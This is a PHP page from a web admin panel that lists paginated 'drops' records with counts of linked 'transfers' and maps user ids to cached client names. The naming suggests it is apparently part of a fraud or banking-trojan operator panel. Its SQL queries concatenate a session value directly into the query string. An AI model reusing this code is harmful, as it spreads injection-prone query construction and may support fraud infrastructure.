<?php

get_function('html_pages');
$page['count_page'] = 25;

$cdb = 'cache/clients_list.json';
if(file_exists($cdb)){
	$cl = @json_decode(@file_get_contents($cdb), true);
}else{
	$cl = array();
}

$smarty->assign('cl', $cl);

function cnuid($userid = ''){
    global $cl;

    if(empty($userid)){
        return '&nbsp;';
    }else{
        if(!empty($cl[$userid])){
            return $cl[$userid];
        }else{
            return $userid;
        }
    }
}

if(!empty($_SESSION['user']->config['userid'])){
    $count_users = $mysqli->query_name('SELECT COUNT(id) count FROM bf_drops WHERE (userid = \''.$_SESSION['user']->config['userid'].'\')');
    $smarty->assign("list", $mysqli->query('SELECT a.*, (SELECT COUNT(id) count FROM bf_transfers b WHERE (b.drop_id = a.id)) count FROM bf_drops a WHERE (userid = \''.$_SESSION['user']->config['userid'].'\') ORDER by a.id DESC LIMIT '.($Cur['page'] == 0 ? 0 : $Cur['page']*$page['count_page']).','.$page['count_page'], null, null, false));
}else{
    $count_users = $mysqli->table_rows('bf_drops');
    $smarty->assign("list", $mysqli->query('SELECT a.*, (SELECT COUNT(id) count FROM bf_transfers b WHERE (b.drop_id = a.id)) count FROM bf_drops a ORDER by a.id DESC LIMIT '.($Cur['page'] == 0 ? 0 : $Cur['page']*$page['count_page']).','.$page['count_page'], null, null, false));
}

$smarty->assign('pages', html_pages('/drops/?', $count_users, $page['count_page']));
$smarty->assign('count_users', $count_users);

$smarty->assign('title', $lang['drops']);

?>